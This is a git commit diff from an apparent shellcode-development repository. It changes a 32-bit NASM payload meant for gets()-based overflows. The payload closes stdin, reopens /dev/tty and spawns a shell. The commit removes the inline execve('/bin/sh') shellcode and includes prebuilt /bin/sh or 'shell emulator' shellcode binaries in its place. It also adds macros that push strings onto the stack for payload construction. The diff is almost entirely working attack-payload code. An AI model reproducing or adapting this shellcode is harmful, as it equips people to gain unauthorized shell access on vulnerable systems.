06eda4814472de74da8ca7aef5cc320bcb593837
Evan Jensen <evan.p.jensen@gmail.com>
2014-06-18 13:52:50 -0400

    added a macro that makes pushing strings on the stack easy

--- getsShellcode/getsShellcode.s
+++ getsShellcode/getsShellcode.s
@@ -3,14 +3,14 @@
 BITS 32
 	
 %include "short32.s"
+%include "syscall.s"
 	global main
 
 main:
 _close:
 	xor eax,eax
 	xor ebx,ebx
-	mov al,close
-	int 0x80		;close stdin
+	SYSTEM_CALL(close) 	;close(STDIN_FILENO)
 tty:
 	push ebx
 	push 0x7974742f
@@ -18,17 +18,15 @@ tty:
 	mov ebx,esp 		;/dev/tty
 	xor ecx,ecx
 	mov cl,2		;O_RDRW
-	mov al,open		
-	int 0x80	;open("/dev/tty",O_RDRW);
-	
+	SYSTEM_CALL(open)	;open("/dev/tty",O_RDRW);
+
 	;; Any local shellcode here
-sh:	
-	xor eax,eax
-	push eax
-	push 0x68732f2f
-	push 0x6e69622f
-	mov ebx,esp
-	xor edx,edx
-	xor ecx,ecx
-	mov al,execve
-	int 0x80
+	
+%define EMULATOR
+%ifdef 	EMULATOR
+	;; shell emulating shellcode
+	incbin "../32shellEmulator/shellcode"
+%else
+	;; ordinary shellcode (/bin/sh)
+	incbin "../32bitLocalBinSh/shellcode"
+%endif
--- include/util.s
+++ include/util.s
@@ -15,5 +15,66 @@
     (((x) & 0xff000000) >> 24))
 
 %define htons(x) ((((x) & 0xff00) >> 8) | (((x) & 0x00ff) << 8))
+
 %define ip(a,b,c,d) htonl(a << 24 | b << 16 | c << 8 | d) ; ip(127,0,0,1)
+	
+%define htonx(x)            \
+	%if    __BITS__==16 \
+		htons(x)    \
+	%elif  __BITS__==32 \
+		htonl(x)    \
+	%elif  __BITS__==64 \
+		htonq(x)    \
+	%elif               \
+		%error "__BITS__ is not 16, 32 or 64" \
+	%endif
+
+%macro str_null_check 1
+	%assign word_length __BITS__/8
+	%strlen len_arg %1
+	%if len_arg % word_length!=0
+		%fatal "Make string a multiple of the word length"
+	%endif
+%endmacro
+
+%macro str_null_check 2
+	%assign word_length %2/8
+	%strlen len_arg %1
+	%if len_arg % word_length!=0
+		%fatal "Make string a multiple of the word length"
+	%endif
+%endmacro
+	
+	;; The PUSH_STRING macros don't null terminate the string
+	;; arguments must be known at assemble time
+
+	
+%macro PUSH_STRING 2 		;string, bitcount
+	str_null_check %1 %2
+	%assign word_length %2/8
+	%strlen string_length %1
+	%assign num_pushes string_length/word_length
+	%assign index string_length
+	%rep num_pushes
+		%substr slice %1 index-word_length+1,word_length
+		%assign index index-word_length
+		push slice
+		%warning push slice
+	%endrep
+%endmacro 
+
+%macro PUSH_STRING 1 		;string
+	str_null_check %1
+	%assign word_length __BITS__/8
+	%strlen string_length %1
+	%assign num_pushes string_length/word_length
+	%assign index string_length
+	%rep num_pushes
+		%substr slice %1 index-word_length+1,word_length
+		%assign index index-word_length
+		push slice
+		%warning push slice
+	%endrep
+%endmacro 
+
 
